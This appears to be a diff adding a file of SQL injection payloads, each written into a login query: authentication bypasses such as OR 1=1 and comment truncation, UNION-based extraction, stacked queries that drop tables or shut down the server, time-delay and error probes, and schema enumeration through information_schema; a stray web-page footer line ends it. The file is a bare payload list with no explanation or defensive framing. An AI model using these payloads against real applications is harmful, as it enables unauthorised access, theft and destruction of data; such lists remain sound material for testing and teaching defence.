@@ -1,0 +1,28 @@
+SELECT * FROM users WHERE username='*' AND password=''
+SELECT * FROM users WHERE username='admin'--' AND password=''
+SELECT * FROM users WHERE username='admin' AND password='' OR 1=1--'
+SELECT * FROM users WHERE username='';SHUTDOWN --' AND password=''
+SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'
+SELECT * FROM users WHERE username='SELECT Username FROM Users WHERE ID=1' AND password='SELECT MD5(Password) FROM Users WHERE ID=1'
+SELECT * FROM users WHERE username='*' AND password=''
+SELECT * FROM users WHERE username='admin'#' AND password=''
+SELECT * FROM users WHERE username='';DROP tempTable;' AND password=''
+SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 --IamJOE'
+SELECT * FROM users WHERE username='admin' AND password=' ' OR ''=''
+SELECT * FROM users WHERE username='admin' AND password=%27%20or%20%27%27%3D%27
+SELECT * FROM users WHERE username='' AND password='' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- '
+SELECT * FROM users WHERE username='' AND users NOT IN ('First User', 'Second User');--' AND password=''
+SELECT * FROM users WHERE username='admin';DROP myTable--' AND password=''
+SELECT * FROM users WHERE username='/*!32302 1/0, */' AND password=''
+SELECT * FROM users WHERE username='' AND password='';IF((SELECT user) = 'sa' OR (SELECT user) = 'dbo') SELECT 1 ELSE SELECT 1/0;--'
+SELECT * FROM users WHERE username='';waitfor delay '0:0:10'--' AND password=''
+SELECT * FROM users WHERE username='CAST('username' AS SIGNED INTEGER)' AND password=''
+SELECT * FROM users WHERE username='' UNION SELECT SUM(columntofind) FROM users--' AND password=''
+SELECT * FROM users WHERE username='' AND password='' ORDER BY 1;--'
+SELECT * FROM users WHERE username='' + (SELECT TOP 1 username FROM users ) + '' AND password='' + (SELECT TOP 1 password FROM users ) + ''
+SELECT * FROM users WHERE username='';SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'known_table_name');--' AND password=''
+SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
+SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
+SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';
+SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';
+Status API Training Shop Blog About
